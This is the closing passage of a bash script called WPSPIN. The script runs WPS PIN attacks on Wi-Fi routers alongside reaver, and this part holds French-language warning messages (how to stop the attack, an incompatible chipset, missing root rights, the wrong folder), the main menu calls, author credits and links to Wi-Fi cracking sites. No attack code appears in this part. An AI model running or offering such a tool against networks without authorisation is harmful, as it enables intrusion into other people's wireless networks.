STOP_REAVER=$(echo -e " $rojo                 < CTRL + C > POUR ARRÊTER L'ATTAQUE $colorbase "
 )





AIRMON_WARNING=$(echo -e "
 $rojo                     ATTENTION!$amarillo CHIPSET NON COMPATIBLE!

$rojo           Le bon fonctionnement du scan et de l'attaque sont compromis    
$rojo          Il est recommandé de choisir l'option 3 (changer d'interface)$colorbase "
 )




ROOT_ADVERTENCIA=$( echo -e "                                        
                 $rojo      ATTENTION! $amarillo PAS DE PRIVILEGES ROOT 
$colorbase
$rojo Vous devez avoir des droits d'administrateur pour exécuter pleinement WPSPIN
          lancez le script avec sudo ou depuis une console root$colorbase" 
)                                                                                              # warning display for non root user




DIRECTORY_ADVERTENCIA=$( echo -e "                                        
                 $rojo       ATTENTION! $amarillo LOCATION INCORRECTE
$colorbase
$rojo   Vous devez être situé dans le dossier WPSPIN pour exécuter le script
   Laissez le script dans son dossier, ne changez pas le nom du dossier 
                    et utilisez cd pour vous situer $colorbase" 
)                                                                                              # warning display for non WPSPIN directory







fi





#################################################################################################################################################################
#####################################################THAT'S IT, ALL FUNCTIONS ARE DEFINED, NOW START THE REST OF SCRIPT##########################################
################################################################
##############################################################################################
#############################################           2    -   START  , the RESTART, THIS is the script
##############################################################################








IFACE                                             #     We first invocate iface tio check the interface compoatibility
REAVER_CHECK                                      #     And if reaver is installed
BIG_MENUE
exit 0                                                  # if this two parameters arae OK than the user can acsses teh big menue, otherwise he will be limited to short menue



###############################################################################################################################################
############################################################################################
######################################################################################################
###############################################################################################"
#                                                END OF THE SCRIPT                                                                            #

#                          by kcdtv with a big help form my firends anatares_145, 1camaron1 and r00tnuLL                                      #

###############################################################################################################################################

#     www.crack-wifi.com      www.lampiweb.com     www.auditorias wireless.net

########################################################################################

#  GENERAL PUBLIC LICENSE VERSION 3

########################################################################################################......
